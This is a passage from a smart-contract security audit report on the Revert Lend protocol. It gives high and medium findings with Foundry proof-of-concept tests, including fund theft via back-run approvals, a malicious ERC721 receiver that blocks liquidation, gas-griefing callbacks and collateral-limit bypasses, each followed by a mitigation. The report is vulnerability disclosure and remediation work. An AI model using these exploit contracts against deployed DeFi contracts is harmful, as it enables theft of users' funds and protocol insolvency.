    uint256 usdcAfter = USDC.balanceOf(attacker);
    (,,,,,,, uint128 liquidityAfter,,,,) = NPM.positions(TEST_NFT_3);

    console.log("Attacker's DAI Balance After: %e", daiAfter);
    console.log("Attacker's USDC Balance After: %e", usdcAfter);
    console.log("Position #%s's liquidity After: %e", TEST_NFT_3, liquidityAfter);
}
```

Console output:

    Ran 1 test for test/integration/V3Utils.t.sol:V3UtilsIntegrationTest
    [PASS] test_backRunApprovals_toStealAllFunds() (gas: 351245)
    Logs:
      Attacker's DAI Balance Before: 0e0
      Attacker's USDC Balance Before: 0e0
      Position #4660's liquidity Before: 1.2922419498089422291e19
      
    --ATTACK OCCURS--

      Attacker's DAI Balance After: 4.2205702812280886591005e22
      Attacker's USDC Balance After: 3.5931648355e10
      Position #4660's liquidity After: 0e0

    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.17s

    Ran 1 test suite in 1.17s: 1 tests passed, 0 failed, 0 skipped (1 total tests)


### Recommended Mitigation Steps

Add a check to ensure that only the owner of the position can call `V3Utils.execute`.

Note the fix also checks for the case where a user may have transferred the token into the `V3Utils`. In that case it is fine that `msg.sender != tokenOwner`, since `tokenOwner` would then be the V3Utils contract itself.

```diff
function execute(uint256 tokenId, Instructions memory instructions) public returns (uint256 newTokenId) {
        
+       address tokenOwner = nonfungiblePositionManager.ownerOf(tokenId);
+       if (tokenOwner != msg.sender && tokenOwner != address(this)) {
+           revert Unauthorized();
+       }
    
    /* REST OF CODE */
}
```

### Assessed type

Access Control

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/141#issuecomment-2020693338)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PR [here](https://github.com/revert-finance/lend/pull/29) - refactoring to make all transformers properly check caller permission.

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/79), [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/43) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/22).

***

## [[H-05]  `_getReferencePoolPriceX96()` will show incorrect price for negative tick deltas in current implementation cause it doesn't round up for them](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/127)
*Submitted by [Bauchibred](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/127), also found by grearlake ([1](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/498), [2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/410)), [Giorgio](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/482), and [kodyvim](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/169)*

Take a look [here](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Oracle.sol#L357-L374).

```solidity
    function _getReferencePoolPriceX96(IUniswapV3Pool pool, uint32 twapSeconds) internal view returns (uint256) {
        uint160 sqrtPriceX96;
        // if twap seconds set to 0 just use pool price
        if (twapSeconds == 0) {
            (sqrtPriceX96,,,,,,) = pool.slot0();
        } else {
            uint32[] memory secondsAgos = new uint32[](2);
            secondsAgos[0] = 0; // from (before)
            secondsAgos[1] = twapSeconds; // from (before)
            (int56[] memory tickCumulatives,) = pool.observe(secondsAgos); // pool observe may fail when there is not enough history available (only use pool with enough history!)
            //@audit
            int24 tick = int24((tickCumulatives[0] - tickCumulatives[1]) / int56(uint56(twapSeconds)));
            sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);
        }

        return FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, Q96);
    }
```

This function is used to calculate the reference pool price. It uses either the latest slot price or TWAP based on twapSeconds.

Now note that [unlike the original uniswap implementation](https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/libraries/OracleLibrary.sol#L30), here the delta of the tick cumulative is being calculated in a different manner, i.e [protocol implements (`tickCumulatives`[0] - `tickCumulatives`[1]](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Oracle.sol#L369) instead of `tickCumulatives[1] - (tickCumulatives[0]` which is because here, `secondsAgos[0] = 0;` and  `secondsAgos[1] = twapSeconds;`; unlike [in Uniswap OracleLibrary](https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/libraries/OracleLibrary.sol#L23C1-L26C1) where `secondsAgos[0] = secondsAgo;` and `secondsAgos[1] = 0;`, so everything checks out and the tick deltas are calculated accurately, i.e in our case `tickCumulativesDelta = tickCumulatives[0] - tickCumulatives[1]`.

The problem now is that in the case if our `tickCumulativesDelta` is negative, i.e `int24(tickCumulatives[0] - tickCumulatives[1] < 0)` , then the tick should be rounded down, as it's done in the[ uniswap library](https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L36).

But this is not being done and as a result, in the case if `int24(tickCumulatives[0] - tickCumulatives[1])` is negative and `(tickCumulatives[0] - tickCumulatives[1]) % secondsAgo != 0`, then the returned tick will be bigger then it should be; which opens possibility for some price manipulations and arbitrage opportunities.

### Impact

1. In this case, if `int24(tickCumulatives[0] - tickCumulatives[1])` is negative and `((tickCumulatives[0] - tickCumulatives[1]) % secondsAgo != 0`, then returned tick will be bigger than it should be which places protocol wanting prices to be right not be able to achieve this goal. Note that whereas protocol in some cases relies on multiple sources of price, they still come down and end on weighing the differences between the prices and reverting if a certain limit is passed (`MIN_PRICE_DIFFERENCE`) between both the Chainlink price and Uniswap twap price.

2. Now in the case where the implemented [pricing mode is only `TWAP`](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Oracle.sol#L40), then the protocol would work with a flawed price since the returned price would be different than it really is; potentially leading to say, for example, some positions that should be liquidatable not being liquidated. Before liquidation, there is [a check to see if the loan is healthy](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Vault.sol#L702-L703). Now this check [queries the value of this asset via getValue() ](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Vault.sol#L1275) and if returned price is wrong then unhealthy loans could be pronounced as healthy and vice versa.

3. Also, this indirectly curbs the access to functions like `borrow()`, `transform()` and `decreaseLiquidityAndCollect()`, since they all make a call to [`_requireLoanIsHealthy()`](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Vault.sol#L1199-L1205), which would be unavailable due to it's dependence on [`_checkLoanIsHealthy()`](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Vault.sol#L702-L703).

4. This bug case causes the Automator's [`_getTWAPTick()` function to also return a wrong tick, which then leads to `_hasMaxTWAPTickDifference()` returning false data ](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/automators/Automator.sol#L168-L197), since the difference would now be bigger eventually leading to *wrongly* [disabling/enabling of swaps in `AutoCompound.sol`](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/transformers/AutoCompound.sol#L130-L139), whereas, it should be otherwise.

Note that for the second/third case, the call route to get to `_getReferencePoolPriceX96()` is: `"_checkLoanIsHealthy() -> getValue() -> _getReferenceTokenPriceX96 ->  _getTWAPPriceX96 -> _getReferencePoolPriceX96() "` as can be seen [here](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Oracle.sol).

### Tools Used

- [Uniswap V3's OracleLibrary](https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/libraries/OracleLibrary.sol).
- And a similar finding on [Code4rena](https://github.com/code-423n4/2024-01-salty-findings/issues?q=is%3Aissue+is%3Aopen+\_getUniswapTwapWei%28%29+will+show+incorrect+price+for+negative+ticks+cause+it+doesn%27t+round+up+for+negative+ticks.) from Q1 2024.

### Recommended Mitigation Steps

Add this line: `if (tickCumulatives[0] - tickCumulatives[1] < 0 && (tickCumulatives[0] - tickCumulatives[1]) % secondsAgo != 0) timeWeightedTick --;`.

### Assessed type

Uniswap

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/127#issuecomment-2020681837)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PR [here](https://github.com/revert-finance/lend/pull/10) - fixed calculation.

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/80), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/26) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/10).

***

## [[H-06] Owner of a position can prevent liquidation due to the `onERC721Received` callback](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/54)
*Submitted by [0xjuan](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/54), also found by [CaeraDenoir](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/499), [kinda\_very\_good](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/476), [falconhoof](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/467), [0x175](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/450), [Arz](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/443), [JohnSmith](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/413), [alix40](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/408), [stackachu](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/378), [givn](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/335), [wangxx2026](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/319), [Ocean\_Sky](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/290), [0xloscar01](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/279), [SpicyMeatball](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/247), [0xAlix2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/237), [Ali-\_-Y](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/235), [0rpse](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/115), [iamandreiski](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/114), [0xBugSlayer](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/76), [nmirchev8](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/51), [nnez](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/36), [ayden](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/25), and [novamanbg](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/8)*

When liquidating a position, `_cleanUpLoan()` is called on the loan. This attempts to send the uniswap LP position back to the user via the following line:

```solidity
nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);
```

This `safeTransferFrom` function call invokes the `onERC721Received` function on the owner's contract. The transaction will only succeed if the owner's contract returns the function selector of the standard `onERC721Received` function. However, the owner can design the function to return an invalid value, and this would lead to the `safeTransferFrom` reverting, thus being unable to liquidate the user.

### Impact

This leads to bad debt accrual in the protocol which cannot be prevented, and eventually insolvency.

### Proof of Concept

Below is a foundry test that proves this vulnerability. To run the PoC:

1. Copy the attacker contract into `test/integration/V3Vault.t.sol`.
2. In the same file, copy the contents of the 'foundry test' dropdown into the `V3VaultIntegrationTest` contract.
3. In the terminal, enter `forge test --via-ir --mt test_preventLiquidation -vv`.

Attacker Contract:

```solidity
contract MaliciousBorrower {
    
    address public vault;

    constructor(address _vault) {
        vault = _vault;
    }
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {

        // Does not accept ERC721 tokens from the vault. This causes liquidation to revert
        if (from == vault) return bytes4(0xdeadbeef);

        else return msg.sig;
    }
}
```

Foundry test:

```solidity
function test_preventLiquidation() external {
        
        // Create malicious borrower, and setup a loan
        address maliciousBorrower = address(new MaliciousBorrower(address(vault)));
        custom_setupBasicLoan(true, maliciousBorrower);

        // assert: debt is equal to collateral value, so position is not liquidatable
        (uint256 debt,,uint256 collateralValue, uint256 liquidationCost, uint256 liquidationValue) = vault.loanInfo(TEST_NFT);
        assertEq(debt, collateralValue);

        // collateral DAI value change -100%
        vm.mockCall(
            CHAINLINK_DAI_USD,
            abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
            abi.encode(uint80(0), int256(0), block.timestamp, block.timestamp, uint80(0))
        );
        
        // ignore difference
        oracle.setMaxPoolPriceDifference(10001);

        // assert that debt is greater than collateral value (position is liquidatable now)
        (debt, , collateralValue, liquidationCost, liquidationValue) = vault.loanInfo(TEST_NFT);
        assertGt(debt, collateralValue);

        (uint256 debtShares) = vault.loans(TEST_NFT);

        vm.startPrank(WHALE_ACCOUNT);
        USDC.approve(address(vault), liquidationCost);

        // This fails due to malicious owner. So under-collateralised position can't be liquidated. DoS!
        vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));
    }

    function custom_setupBasicLoan(bool borrowMax, address borrower) internal {
        // lend 10 USDC
        _deposit(10000000, WHALE_ACCOUNT);  

        // Send the test NFT to borrower account
        vm.prank(TEST_NFT_ACCOUNT);
        NPM.transferFrom(TEST_NFT_ACCOUNT, borrower, TEST_NFT);

        uint256 tokenId = TEST_NFT;

        // borrower adds collateral 
        vm.startPrank(borrower);
        NPM.approve(address(vault), tokenId);
        vault.create(tokenId, borrower);

        (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);

        // borrower borrows assets, backed by their univ3 position
        if (borrowMax) {
            // borrow max
            vault.borrow(tokenId, collateralValue);
        }
        vm.stopPrank();
    }
```

Terminal output:

```
Ran 1 test for test/integration/V3Vault.t.sol:V3VaultIntegrationTest
[PASS] test_preventLiquidation() (gas: 1765928)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 473.56ms
```

### Recommended Mitigation Steps

One solution would be to approve the NFT to the owner and provide a way (via the front-end or another contract) for them to redeem the NFT back later on. This is a "pull over push" approach and ensures that the liquidation will occur.

Example:

```diff
    function _cleanupLoan(uint256 tokenId, uint256 debtExchangeRateX96, uint256 lendExchangeRateX96, address owner)
        internal
    {
        _removeTokenFromOwner(owner, tokenId);
        _updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, loans[tokenId].debtShares, 0);
        delete loans[tokenId];
-        nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);
+       nonfungiblePositionManager.approve(owner, tokenId);
        emit Remove(tokenId, owner);
    }
```

### Assessed type

DoS

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/54#issuecomment-2020626772)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PRs [here](https://github.com/revert-finance/lend/pull/8) and [here](https://github.com/revert-finance/lend/pull/32) - removed sending of NFT to avoid reentrancy.

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/81), [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/36) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/27).

***
 
# Medium Risk Findings (25)
## [[M-01] An attacker can easily bypass the collateral value limit factor checks](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/466)
*Submitted by [Arz](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/466), also found by [lanrebayode77](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/133)*

The collateral value limit factor checks in `_updateAndCheckCollateral()` are used to check if the current value of used collateral is more than the allowed limit. The problem here is that these checks are not done when withdrawing lent tokens so an attacker can easily bypass these checks.

Example:

1. The collateral value limit factor is set to 90% for both collateral tokens.
2. The lent amount is 100 USDC and Alice has borrowed 90 USDC.
3. An attacker wants to borrow the remaining 10 USDC but he cant because of the checks.
4. He executes an attack in 1 transaction - he supplies 10 USDC, borrows 10 USDC and then withdraws the 10 USDC that he lent.
5. The amount borrowed is 100 USDC even though the collateral factor is 90%.

The attacker can do this to bypass the checks, this can also block calls from the AutoRange automator. Whenever a new position is sent, `_updateAndCheckCollateral()` is called, which will revert because the attacker surpassed the limits.

### Impact

The attacker can easily surpass the limits, this can also make calls from AutoRange revert because `_updateAndCheckCollateral()` is called when the position is replaced and it will revert because the limits were surpassed. The automator will fail to change the range of the positions.

### Proof of Concept

Add this to `V3Vault.t.sol`, as you can see the limits were surpassed:

```solidity
function testCollateralValueLimit() external {
        _setupBasicLoan(false);

        //set collateral value limit to 90%
        vault.setTokenConfig(address(DAI), uint32(Q32 * 9 / 10), uint32(Q32 * 9 / 10));

        vm.prank(TEST_NFT_ACCOUNT);
        vault.borrow(TEST_NFT, 8e6);

        //10 USDC were lent and 2 USDC were borrowed
        //Attacker can only borrow 1 USDC because of the collateral value limit

        //What he does is supplies 2 USDC, borrows 2 USDC and then withdraws what he lent
        _deposit(2e6, TEST_NFT_ACCOUNT_2);
        _createAndBorrow(TEST_NFT_2, TEST_NFT_ACCOUNT_2, 2e6);

        vm.prank(TEST_NFT_ACCOUNT_2);
        vault.withdraw(2e6, TEST_NFT_ACCOUNT_2, TEST_NFT_ACCOUNT_2);

        (,,uint192 totalDebtShares) = vault.tokenConfigs(address(DAI));
        console.log("The total amount of shares lent:", vault.totalSupply());
        console.log("The total amount of shares borrowed:", totalDebtShares);
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Not sure how this should be fixed as the collateral tokens are configured separately and the collateral factors can differ. However, maybe preventing depositing and withdrawing in the same tx/small fee can help this.

### Assessed type

Invalid Validation

**[kalinbas (Revert) acknowledged and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/466#issuecomment-2021462380):**
 > - The fact that AutoRange automator doesn't work if the collateral limit is reached is no problem (this is as designed).
> - The fact that withdrawing lent assets can lead to `collateral value > limit` is no problem because it is limited to a certain percentage (it's not possible to add a huge amount, borrow it, and withdraw it (because it is borrowed)).

***

## [[M-02] Protocol can be repeatedly gas griefed in `AutoRange` external call](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/459)
*Submitted by [falconhoof](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/459), also found by [ktg](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/184) and [novamanbg](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/29)*

Revert controlled `AutoRange` bot can be gas griefed and `execute()` reverted by malicious `onERC721Received` implementation

### Vulnerability Details

The initiator of a transaction pays the transaction gas; in the case of `AutoRange::execute()` and `AutoRange::executeWithVault()`, this will be a Revert controlled bot which is set up as an `operator`. Newly minted NFTs are sent to users via `NPM::safeTransferFrom()` which uses the `onERC721Received` callback.

An attacker can implement a malicious implementation of this callback, by wasting all the transaction gas and reverting the function to grief the protocol. It is expected that the gas spent by bots initiating transactions will be covered by protocol fees; however, no protocol fees will be generated from the attacker's position, as `AutoRange::execute()` will not complete; so the protocol will experience a loss.

Furthermore, once an attacker has set the token's config from `positionConfigs`, the protocol has no way to stop the griefing occurring each time the bot detects that the tokenId meets the conditions for a Range Change.
Token Config is only removed from `positionConfigs` at the end of `execute()`, which the gas grief will prevent from being reached making it a recurring attack. The only recourse to the protocol is shutting down the contract completely by removing the bot address as an `operator` and DOSing the contract.

All this makes the likelihood of this attack quite high as it is a very inexpensive attack; user does not even need an open position and loan in the vault. A determined attacker.

### POC

An attacker would need to create a malicious contract to which they send their NPM NFT. Via this contract, they can then add token config for this NFT to the AutoRange contract via `AutoRange::configToken()`. The malicious contract would need to have a malicious implementation, such as the one below, which uses as much gas as possible before reverting.

```solidity
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {

    uint256 initialGas = gasleft();
    uint256 counter = 0;

    // Loop until only small amount gas is left for the revert
    uint256 remainingGasThreshold = 5000;

    while(gasleft() > remainingGasThreshold) {

        counter += 1;
    }

    // Explicitly revert transaction
    revert("Consumed the allotted gas");
        
    }
```

### Impact

Protocol fees can be completely drained; particularly if a determined attacker sets token configs for multiple NFTs in `AutoRange`, all linked to the same malicious contract. Lack of fees can DOS multiple functions like the bot initiated `AutoRange` functions and affect the protocol's profitability by draining fees.

### Tools Used

Foundry Testing

### Recommended Mitigation Steps

Enact a `pull` mechanism by transferring the newly minted NFT to a protocol owned contract, such as the `AutoRange` contract itself, from where the user initiates the transaction to transfer the NFT to themselves.

**[kalinbas (Revert) acknowledged and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/459#issuecomment-2021168903):**
 > All these cases are possible but we are monitoring these off-chain bots and also implement gas-limiting, and taking action where needed.

**[ronnyx2017 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/459#issuecomment-2028545446):**
 > valid gas grief, but not a persistent dos, so Medium.

**[falconhoof (warden) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/459#issuecomment-2032076760):**
 > @ronnyx2017 - When a user adds their position's config details via `configToken()`, the `positionConfigs` mapping is updated accordingly. From what I can see, there is no way to remove that config apart from at the end of `execute()`.
>
> Everytime the parameters defined in `positionConfigs` are met, the bot will call `execute()`, get griefed and user's token config will remain in state. A malicious user can set up multiple `positionConfigs` to grief, with many different parameter trigger points, and the only recourse would be the shutting down of the `AutoRange` contract. 
>
> Once a new contract is set up of course the exact same thing can be done again, so I think it's a strong case for a full DOS of this part of the protocol's functionality and loss of funds for the protocol, which would be more than dust.

**[kalinbas (Revert) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/459#issuecomment-2032123295):**
 > The logic which positions to execute is the responsibility of the bot. If there are worthless tokens detected or the tx simulation is not what expected the bot doesn't execute the operation. So this is a risk which is controlled off-chain. 

**[falconhoof (warden) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/459#issuecomment-2032205099):**
 > How would that work? It doesn't seem possible to foresee getting griefed, at least the first time and after that would the tokenId be blacklisted to prevent further griefing, which necessitates the shutting down of the contract?
> 
> Also, the mitigation of bots monitoring the contract is not documented under the list of known issues of the Contest's README. I think it's fair to flag this issue and leave up to the judge to decide if mitigation can be applied retrospectively after the audit.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/459#issuecomment-2036361185):**
 > I cannot understand what the warden is referring to with the "shutting down of the AutoRange contract". There is no reason for the operator to waste gas on a transaction that continuously fails. Gas griefing is valid, and it will indeed continue to deplete the resources of the off-chain operator, but this does not constitute a substantial DoS. For predictions on any future actions/deployments, please refer to [this org issue](https://github.com/code-423n4/org/issues/72).

***

## [[M-03] No `minLoanSize` means liquidators will have no incentive to liquidate small positions](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/455)
*Submitted by [falconhoof](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/455), also found by [grearlake](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/511)*

No `minLoanSize` can destabilise the protocol.

### Vulnerability Details

According to protocol team, they plan to roll out the protocol with `minLoanSize = 0` and adjust that number if needs be. This can be a big issue because there will be no incentive for liquidators to liquidate small underwater positions given the gas cost. To do so would not make economic sense based on the incentive they would receive.

It also opens up a cheap attack path for would be attackers where they can borrow many small loans, which will go underwater as they accrue interest, but will not be liquidated.

### Impact

Can push the entire protocol into an underwater state. Underwater debt would first be covered by Protocol reserves and where they aren't sufficient, lenders will bear the responsibility of the uneconomical clean up of bad debt, so both the protocol and lenders stand to lose out.

### Recommended Mitigation Steps

Close the vulnerability by implementing a realistic `minLoanSize`, which will incentivise liquidators to clean up bad debt.

**[kalinbas (Revert) acknowledged and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/455#issuecomment-2021465002):**
 > Will do the deployment with a reasonable `minLoanSize`.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/455#issuecomment-2028742056):**
 > Normally, I would mark such issues as Low. But given that this issue provides a substantial reminder to the sponsor, I am retaining it as Medium.

***

## [[M-04] Due to interest rates update method, Interest-Free Loans are possible and the costs of DoS are reduced](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/435)
*Submitted by [alix40](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/435), also found by [0xPhantom](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/338), Norah ([1](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/286), [2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/283)), [ktg](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/271), and [lanrebayode77](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/134)*

Allowing in interest free debt in 1 block could have several unwanted results:

- Allowing for in same block (not necessarily same transaction) **interest-free loans**, could be abused by wales for arbitrage operations, resulting in protocol users unable to borrow because of the daily limit.
- **DoS attacks**, with the new updates on the main net resulting in way lower transaction fees, a whale account with a big position could borrow a big amount of money and then repay it in the same block; resulting in him not paying any interest, and users unable to borrow in this block. The attack will then be repeated in each block resulting in DoS.

The attack would result not only in DoS, but also the protocol Liquidity Providers (LPs), and the protocol would lose potential interest payments for their deposits.

Please also note, that in L2 blockchains, it is quite common for multiple L2 Blocks to have the same `block.timestamp`. So borrower could potentially have interest-free debt on the span of multiple blocks.

### Proof of Concept

To prove the severance of the problems, we want to first demonstrate the math around the cost of a 24 hours DoS attack. Second, we want to demonstrate through a coded PoC, that when borrowing in the same block, there are no fees to be paid.

**24 hours DoS costs:**

Because the debt is interest free (see next step, for PoC) the cost of a 24 hours DoS attack is the cost of the gas to borrow and repay the loan. Due to the new changes deployed to Ethereum (Ethereum's Dencun upgrade) the transactions fees on L2 like arbitrum, have massively decreased, resulting in a cost of around `$0.1` per transaction. Right now on arbitrum, on average a block is minted each 15 seconds, resulting in 4 blocks per minute, 240 blocks per hour, and 5760 blocks per day. The cost of a single attack in a single block is `(0.1 * 2)` + `0.2 ~ 0.5 usd` for the first `borrow()` to front run the other transactions in the block. The cost of a 24 hours DoS attack is then between `5760 * (0.1 * 2 + 0.2) =2304 usd`  and `5760 * (0.1 * 2 + 0.5)= 4032 usd`. This would allow a whale whith a sufficient LP position that he can use as collateral for the 10% of the Lenders deposits (which is maximum daily borrowing limit). Specially in the early days of the protocol, this doesn't necessary need to be a lot. A realistic scenario would look like this:

- Total Users Deposits 10 million USDC.
- Attacker has an LP position valued at 1.3 million USDC.
- Daily borrowing limit is 10% of the total deposits, so 1 million USDC.
- Attack Budget for attacker `~` 5000 USDC.
- The attacker first borrows 1 million USDC at the start of the block (frontrun), and repay it in the same block (backrun); resulting in no interest to be paid and users unable to borrow in the same period.
- The attacker goes on and repeats the attack repeatedly for 24 hours.

**Proof that no fees are paid when borrowing and repaying in the same block:**

It is intended by the protocol developers to only update interest rates once per block, and not for each transaction. This design choice could be shown in the `_updateGlobalInterest()` method:

```solidity
function _updateGlobalInterest()
        internal
        returns (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96)
    {
        // only needs to be updated once per block (when needed)
        if (block.timestamp > lastExchangeRateUpdate) {
            (newDebtExchangeRateX96, newLendExchangeRateX96) = `_calculateGlobalInterest()`;
            lastDebtExchangeRateX96 = newDebtExchangeRateX96;
            lastLendExchangeRateX96 = newLendExchangeRateX96;
            lastExchangeRateUpdate = block.timestamp;
            emit ExchangeRateUpdate(newDebtExchangeRateX96, newLendExchangeRateX96);
        } else {
            newDebtExchangeRateX96 = lastDebtExchangeRateX96;
            newLendExchangeRateX96 = lastLendExchangeRateX96;
        }
    }
```

As we can see from the inline comment, it is the intention of the protocol developers to only update the interest rates once per block, and not for each transaction. To showcase that an interest free debt is possible in the same block, please add the following test to `test/integration/V3Vault.t.sol`:

```solidity
    function testInterestFreeDebt() external {
        // @audit initialize Vault
        vm.startPrank(TEST_NFT_ACCOUNT_2);
        USDC.approve(address(vault), 10000000);
        vault.deposit(1000000, TEST_NFT_ACCOUNT_2);
        vm.stopPrank();
        // @audit PoC 
        vm.startPrank(TEST_NFT_ACCOUNT);
        NPM.approve(address(vault), TEST_NFT);
        vault.create(TEST_NFT,TEST_NFT_ACCOUNT);
        console.log("balance of user before borrow",USDC.balanceOf(TEST_NFT_ACCOUNT));
        vault.borrow(TEST_NFT, 100000);
        console.log("balance of user after borrow",USDC.balanceOf(TEST_NFT_ACCOUNT));
        USDC.approve(address(vault), 100000);
        vault.repay(TEST_NFT, 100000, false);
        console.log("balance of user after repay",USDC.balanceOf(TEST_NFT_ACCOUNT));
        // @audit assert that debt paid in full
        assertTrue(NPM.ownerOf(TEST_NFT)==TEST_NFT_ACCOUNT);
    }
```

**Result:**

```log
Running 1 test for test/integration/V3Vault.t.sol:V3VaultIntegrationTest
[PASS] testInterestFreeDebt() (gas: 542028)
Logs:
  balance of user before borrow 0
  balance of user after borrow 100000
  balance of user after repay 0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 418.62ms
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests
```

### Tools Used

Foundry

### Recommended Mitigation Steps

The most simple solution to this issue, is to add a small borrow fee (percentagewise for e.g `0.1%` of borrowed debt). This way even if arbitrageurs try to do swaps, or attackers try to DoS the system, Liquidity Providers will receive their fair yield (potentially a lot more yield if an attacker tries the DoS Attack described in this report).

### Assessed type

Context

**[kalinbas (Revert) acknowledged and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/435#issuecomment-2023646225):**
 >> "Allowing for in same block (not necessarily same transaction) interest-free loans, could be abused by wales for arbitrage operations, resulting in protocol users unable to borrow because of the daily limit."
 >
> If the whale borrow is repayed in the same block - the limit is reset. So other users can borrow in the next block.
> 
